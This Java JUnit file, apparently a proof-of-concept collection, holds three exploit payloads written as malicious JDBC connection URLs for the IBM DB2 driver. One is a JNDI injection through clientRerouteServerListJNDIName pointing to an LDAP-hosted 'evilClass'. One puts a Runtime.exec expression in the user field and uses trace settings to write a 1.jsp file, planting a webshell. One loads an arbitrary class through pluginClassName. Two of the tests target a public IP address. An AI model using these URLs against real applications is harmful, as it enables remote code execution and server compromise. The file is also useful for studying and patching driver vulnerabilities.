package com.trganda.poc;

import org.junit.jupiter.api.Test;

import java.sql.DriverManager;
import java.sql.SQLException;

public class Poc {
    @Test
    public void db2() throws SQLException {
        String url =
                "jdbc:db2://127.0.0.1:5001/db:clientRerouteServerListJNDIName=ldap://127.0.0.1:1389/evilClass;";
        DriverManager.getConnection(url);
    }

    @Test
    public void db2log() throws SQLException {
        String url =
            "jdbc:db2://216.127.190.23:50000/db:user=${Runtime.getRuntime().exec(\"test\")};traceLevel=com.ibm.db2.jcc.DB2BaseDataSource.TRACE_ALL;traceFileAppend=false;traceFile=1.jsp;";
        DriverManager.getConnection(url);
    }

    @Test
    public void db2plugin() throws SQLException {
        String url =
            "jdbc:db2://216.127.190.23:50000/db:pluginClassName=com.sun.security.auth.module.UnixSystem;";
        DriverManager.getConnection(url);
    }
}
